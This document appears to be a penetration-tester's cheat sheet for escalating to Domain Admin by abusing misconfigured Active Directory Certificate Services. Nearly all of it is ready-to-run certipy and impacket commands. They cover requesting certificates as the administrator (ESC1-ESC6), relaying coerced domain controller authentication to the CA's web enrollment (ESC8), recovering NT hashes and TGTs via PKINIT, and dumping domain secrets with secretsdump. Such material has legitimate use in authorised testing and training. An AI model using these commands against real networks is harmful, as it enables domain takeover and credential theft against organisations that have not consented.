AD CS ESC Attacks - Cheat Sheet

Abuse misconfigured Active Directory Certificate Services (AD CS) to obtain a
certificate for a privileged user (e.g. Domain Admin), then use that
certificate to authenticate via Kerberos PKINIT and recover the target's
NT hash / a TGT. Tool of choice: certipy.
Replace the placeholders (<...>) with your own values.


Step 1 - Find vulnerable certificate templates

From Kali with valid domain creds, enumerate the CA and templates:

    certipy find -u <user>@<domain> -p <password> -dc-ip <dc-ip> -stdout -vulnerable

certipy flags each finding as [!] Vulnerable and names the ESC type.
Save full output (JSON/BloodHound) for review:

    certipy find -u <user>@<domain> -p <password> -dc-ip <dc-ip> -bloodhound


=== ESC1 - template allows requester-supplied SAN ===
Template has ENROLLEE_SUPPLIES_SUBJECT + Client Authentication EKU and you
can enroll. Request a cert AS the target by supplying their UPN:

    certipy req -u <user>@<domain> -p <password> -dc-ip <dc-ip> \
        -ca <ca-name> -template <vuln-template> \
        -upn administrator@<domain>

Then authenticate with the cert (see "Use the certificate" below).


=== ESC2 / ESC3 - Any Purpose / Enrollment Agent ===
ESC2: template has Any Purpose (or no) EKU -> use cert for anything.
ESC3: template grants Certificate Request Agent EKU. Get an agent cert,
then request on behalf of the target:

    certipy req -u <user>@<domain> -p <password> -dc-ip <dc-ip> \
        -ca <ca-name> -template <enroll-agent-template>
    certipy req -u <user>@<domain> -p <password> -dc-ip <dc-ip> \
        -ca <ca-name> -template User \
        -on-behalf-of '<domain>\administrator' -pfx <agent>.pfx


=== ESC4 - you have write access over a template ===
Reconfigure the template to be ESC1-vulnerable, exploit, then restore:

    certipy template -u <user>@<domain> -p <password> -dc-ip <dc-ip> \
        -template <template> -write-default-configuration   # make vulnerable
    # ... run the ESC1 request above ...
    certipy template ... -template <template> -write-default-configuration   # restore


=== ESC6 - CA has EDITF_ATTRIBUTESUBJECTALTNAME2 ===
The CA honours requester SAN on ANY template. Same as ESC1 but works against
a normal template (e.g. User):

    certipy req -u <user>@<domain> -p <password> -dc-ip <dc-ip> \
        -ca <ca-name> -template User -upn administrator@<domain>


=== ESC8 - NTLM relay to CA web enrollment (HTTP) ===
The CA exposes web enrollment over HTTP -> relay coerced machine auth to it
and get a cert for the victim machine account. Two terminals:

    # Tab A - listen + relay to the CA's certsrv endpoint
    impacket-ntlmrelayx -t http://<ca-host>/certsrv/certfnsh.asp \
        -smb2support --adcs --template DomainController

    # Tab B - coerce a DC (or target) to authenticate to you
    impacket-printerbug <domain>/<user>:<password>@<dc-ip> <attacker-ip>
    # or PetitPotam / Coercer

ntlmrelayx prints a base64 cert -> save as .pfx and authenticate as the DC$.


--- Use the certificate (all ESC paths converge here) ---
Authenticate with the .pfx via PKINIT to get a TGT + NT hash:

    certipy auth -pfx <cert>.pfx -dc-ip <dc-ip>

This prints the target's NT hash and caches a TGT. Then:

    export KRB5CCNAME=<target>.ccache
    nxc smb <dc-ip> -u administrator -H <recovered-nt-hash>
    impacket-secretsdump -k -no-pass <domain>/administrator@<dc-fqdn>


(optional) Fix clock skew - PKINIT fails on time drift:

    sudo ntpdate <dc-ip>


Key idea: AD CS issues certificates that Kerberos accepts as proof of
identity. A template or CA misconfiguration lets a low-priv user request a
certificate that names a privileged account as its subject - and a cert never
expires from a password change. One vulnerable template can mean instant
Domain Admin. certipy finds the flaw, requests the cert, and authenticates -
end to end.
